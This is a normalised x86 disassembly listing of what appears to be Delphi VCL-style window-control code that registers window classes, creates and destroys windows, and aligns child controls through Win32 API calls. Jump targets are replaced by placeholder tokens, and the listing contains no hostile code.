mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
xor eax eax
mov al [ ebp - 0x5 ]
cmp eax 0x6
ja r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
je r-xdata
sub eax edx
mov [ ebp - 0xc ] eax
adc edx 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_44fd7d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
push eax
call MulDiv
mov edx [ ebp - 0x18 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x18 ] edx
jmp r-xdata
sub eax edx
mov [ ebp - 0x10 ] eax
adc edx 0x0
sub_44ff0c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
xor edx edx
mov dl [ ebp - 0x5 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
cmp edx [ ebp - 0x18 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_44ff3b ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
sub_44ffc4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4507b8
dec eax
test eax eax
jl r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp bl [ eax + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_418314
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] bl
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_418470
lea ecx [ ebp - 0x18 ]
mov edx ebx
call sub_44fb84
pop ecx
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_45077c
mov edi eax
cmp bl [ edi + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp edi [ eax - 0x10 ]
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
xor esi esi
jmp r-xdata
mov eax [ r-xdata ]
and eax [ edi + 0x50 ]
mov edx [ r-xdata ]
cmp edx eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp esi [ eax + 0x8 ]
jge r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov ecx edi
mov edx esi
call sub_4184ec
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx esi
call sub_418470
mov edx eax
mov ecx ebx
mov eax edi
call sub_44faf8
pop ecx
test al al
je r-xdata
test [ edi + 0x51 ] 0x4
jne r-xdata
inc esi
sub_450134
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov bl 0x1
mov eax [ edi ]
call sub_4507b8
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ edi ]
mov edx esi
call sub_45077c
cmp [ eax + 0x5b ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ edi ]
mov edx esi
call sub_45077c
mov dl [ r-xdata ]
cmp dl [ eax + 0x61 ]
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_450188
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
push ebp
call sub_450134
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_450267
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_44ffc4
pop ecx
push ebp
mov al 0x2
call sub_44ffc4
pop ecx
push ebp
mov al 0x3
call sub_44ffc4
pop ecx
push ebp
mov al 0x4
call sub_44ffc4
pop ecx
push ebp
mov al 0x5
call sub_44ffc4
pop ecx
push ebp
mov al 0x6
call sub_44ffc4
pop ecx
push ebp
xor eax eax
call sub_44ffc4
pop ecx
mov eax [ ebp - 0x4 ]
mov si 0xffc7
call sub_40338c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403190
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov si 0xffee
call sub_40338c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x2c ]
sub_45028c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_453d8c
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x160 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_450320
xor eax eax
push ebp
push sub_450313
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x90 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_450328
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x10
jmp r-xdata
sub_450350
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_450415
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_44cb90
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_4507b8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45041c
mov eax [ ebp - 0xc ]
call sub_403190
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_45077c
mov edx eax
mov eax [ ebp - 0xc ]
call sub_418314
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_44c8fc
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_418470
xor ecx ecx
mov edx 0xb03e
call sub_44e340
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_45077c
mov edi eax
mov eax [ edi + 0x4 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x4 ]
jne r-xdata
sub_450424
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4507b8
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_450320
xor edx edx
push ebp
push sub_45050b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_4507b8
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc0
call sub_40338c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
jmp r-xdata
inc edi
xor ebx ebx
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
test ebx ebx
jg r-xdata
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_45077c
mov edx eax
mov eax [ ebp - 0xc ]
call sub_418314
mov edx ebx
dec edx
mov eax [ ebp - 0xc ]
call sub_418470
cmp [ eax + 0x5b ] 0x3
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_403190
mov eax [ ebp - 0x4 ]
call sub_450328
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_45077c
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov dl 0x3
call sub_44c6a0
mov dl 0x4
call sub_44c6a0
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x8 ]
dec edx
mov eax [ ebp - 0xc ]
call sub_418360
sub_450578
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_464518
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
call sub_46823c
sub_450598
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_44ba80
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_44ba80
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_44ba80
jmp r-xdata
mov [ ebx + 0x30 ] esi
sub_4505e4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_44baa8
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_44baa8
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_44baa8
jmp r-xdata
xor eax eax
mov [ ebx + 0x30 ] eax
pop esi
pop ebx
retn
sub_45062c
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_40338c
push 0x1
mov esi ebx
mov ecx esi
mov edx 0xb02c
mov eax edi
call sub_44e340
mov edx ebx
mov eax edi
call sub_450598
test [ ebx + 0x1c ] 0x2
jne r-xdata
push 0x1
mov ecx esi
mov edx 0xb036
mov eax edi
call sub_44e340
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_44e340
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_44e340
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_44e340
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_44e340
mov eax ebx
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov eax edi
call sub_453d8c
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax ebx
call sub_44e340
mov eax edi
call sub_45117c
jmp r-xdata
mov edx ebx
mov eax edi
call sub_45028c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_450700
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
push 0x0
mov edi ebx
mov ecx edi
mov edx 0xb036
mov eax esi
call sub_44e340
mov eax ebx
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov eax esi
call sub_453d8c
test al al
je r-xdata
mov dl 0x1
mov ebp ebx
mov eax ebp
call sub_450578
mov eax ebp
call sub_450fe0
jmp r-xdata
mov edx ebx
mov eax esi
call sub_4505e4
push 0x0
mov ecx edi
mov edx 0xb02c
mov eax esi
call sub_44e340
mov eax esi
call sub_450348
pop ebp
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_44d5d4
sub_45077c
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov ebp [ ebx + 0x198 ]
test ebp ebp
je r-xdata
xor esi esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
mov edx edi
sub edx esi
mov eax [ ebx + 0x19c ]
call sub_418470
mov edx edi
mov eax ebp
call sub_418470
jmp r-xdata
cmp esi edi
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4507d8
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esp ]
call sub_4507b8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_45077c
mov ebp eax
mov edx esi
mov eax [ ebp + 0x3c ]
call [ ebp + 0x38 ]
cmp [ esi + 0xc ] 0x0
jne r-xdata
sub_450818
add esp 0xfffffff0
movzx edx dx
mov [ esp ] edx
xor edx edx
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
call sub_4507d8
add esp 0x10
retn
sub_450840
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x34 ]
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
mov [ ebx + 0x34 ] edi
mov eax [ ebx + 0x24 ]
and eax 0xffffbf1f
or eax 0x3
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0x24 ]
push eax
push esi
push 0x0
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ ebx + 0x34 ]
push eax
call GetClassInfoA
sub_4508ac
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_44d7d0
test al al
je r-xdata
mov eax ebx
call sub_44d800
test al al
je r-xdata
or [ edi ] 0x2000
mov eax ebx
mov si 0xffc8
call sub_40338c
test al al
je r-xdata
or [ edi ] 0x4000
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffca
call sub_40338c
test al al
jne r-xdata
mov eax ebx
mov si 0xffca
call sub_40338c
cmp al 0x1
jne r-xdata
or [ edi ] 0x1000
jmp r-xdata
or [ edi ] 0x0
sub_450914
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_450a32
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
xor ecx ecx
mov edx 0x8c
call sub_402ba4
mov eax [ esi + 0x64 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] 0x44000000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_4508ac
test [ esi + 0x50 ] 0x1
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
or [ ebx + 0x4 ] 0x2000000
or [ ebx + 0x8 ] 0x10000
cmp [ esi + 0x1a4 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax [ esi + 0x40 ]
mov [ ebx + 0xc ] eax
mov eax [ esi + 0x44 ]
mov [ ebx + 0x10 ] eax
mov eax [ esi + 0x48 ]
mov [ ebx + 0x14 ] eax
mov eax [ esi + 0x4c ]
mov [ ebx + 0x18 ] eax
mov edi [ esi + 0x30 ]
test edi edi
je r-xdata
or [ ebx + 0x4 ] 0x10000
or [ ebx + 0x4 ] 0x8000000
mov eax [ esi + 0x190 ]
mov [ ebx + 0x1c ] eax
mov eax edi
call sub_453a88
mov [ ebx + 0x1c ] eax
jmp r-xdata
mov [ ebx + 0x24 ] 0xb
mov eax DefWindowProcA
mov [ ebx + 0x28 ] eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebx + 0x3c ] eax
xor eax eax
mov [ ebx + 0x40 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x34 ] eax
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_4030e0
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404184
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x4c ]
call sub_40873c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450a39
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
sub_450a40
push ebp
mov ebp esp
add esp 0xffffff40
push ebx
push esi
xor edx edx
mov [ ebp - 0xc0 ] edx
mov esi eax
xor eax eax
push ebp
push sub_450c01
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x98 ]
cmp [ ebp - 0x70 ] 0x0
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ esi + 0x174 ] eax
lea eax [ ebp - 0xb4 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test [ ebp - 0x85 ] 0x40
je r-xdata
test al al
je r-xdata
mov edx sub_449f2c
cmp edx [ ebp - 0xb0 ]
je r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov [ ebp - 0x64 ] sub_449f2c
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x68 ]
push eax
call RegisterClassA
test ax ax
jne r-xdata
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call UnregisterClassA
mov [ rw-data ] esi
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x9c ]
cmp [ esi + 0x180 ] 0x0
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xbc ] eax
mov [ ebp - 0xb8 ] 0xb
lea eax [ ebp - 0xbc ]
push eax
push 0x0
lea edx [ ebp - 0xc0 ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0xc0 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8a0
call sub_40395c
test [ ebx + 0x1c ] 0x2
je r-xdata
call sub_40cc74
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
call sub_40cc74
mov eax ebx
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov eax [ esi + 0x64 ]
call sub_4088dc
xor eax eax
mov [ esi + 0x64 ] eax
mov eax esi
call sub_453d98
push 0x1
mov eax [ esi + 0x68 ]
call sub_423a54
mov ecx eax
mov edx 0x30
mov eax esi
call sub_44e340
cmp [ esi + 0x5c ] 0x0
je r-xdata
push 0xfffffff4
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax ebx
call sub_453a88
mov [ ebp - 0x70 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450c08
lea eax [ ebp - 0xc0 ]
call sub_403f20
retn
mov eax esi
mov si 0xffee
call sub_40338c
mov eax [ esi + 0x180 ]
push eax
push 0xfffffff4
push eax
call SetWindowLongA
sub_450c10
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov ecx [ ebx ]
lea edx [ ebx + 0x4c ]
mov eax [ ebx + 0x8 ]
call sub_406b44
mov [ esi + 0x180 ] eax
pop esi
pop ebx
retn
sub_450c50
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41ca90
mov eax esi
call sub_41c9e0
mov [ ebx + 0x1fa ] eax
mov eax esi
call sub_41c9e0
mov [ ebx + 0x1fe ] eax
or [ ebx + 0x98 ] 0x20
mov eax esi
call sub_41ca98
pop esi
pop ebx
retn
sub_450c88
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ ebx + 0x1fa ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0x1fe ] eax
mov eax esi
call sub_41ec9c
mov edx [ ebx + 0x1fa ]
mov eax esi
call sub_41ebd0
mov edx [ ebx + 0x1fe ]
mov eax esi
call sub_41ebd0
mov eax esi
call sub_41eca4
add esp 0x10
pop esi
pop ebx
retn
sub_450cf0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ ebx + 0x1fa ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x1fa
call sub_450cdc
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0x1 ] 0x0
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_418470
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_418470
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
sub_450dc8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_44e678
mov eax [ ebp - 0x8 ]
push eax
push sub_450c50
mov eax [ ebp - 0x8 ]
push eax
push sub_450c88
push ebp
call sub_450cf0
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_450e24
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_44d100
mov esi eax
cmp esi 0x1
jge r-xdata
lea eax [ esi + 0x1 ]
call sub_408890
mov edi eax
mov [ ebx + 0x64 ] edi
mov eax edi
call sub_4088a4
mov ecx eax
mov edx edi
mov eax ebx
call sub_44d110
mov eax r-xdata
call sub_4088b0
mov [ ebx + 0x64 ] eax
jmp r-xdata
call sub_44bbb4
mov eax ebx
mov edx [ eax ]
call [ edx + 0xac ]
pop edi
pop esi
pop ebx
retn
sub_450e7c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x200
xor eax eax
push ebp
push sub_450ec9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x180 ]
push eax
call DestroyWindow
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450ed0
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfdff
retn
call sub_40cc74
sub_450ee0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ edi + 0x19c ]
mov edx ebx
call sub_4184cc
mov esi eax
inc esi
mov eax [ edi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
sub ebx esi
jl r-xdata
xor eax eax
inc ebx
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x19c ]
mov edx esi
call sub_418470
mov eax [ eax + 0x180 ]
test eax eax
jne r-xdata
sub_450f28
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xa0 ]
mov esi ebx
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
mov esi [ ebx + 0x30 ]
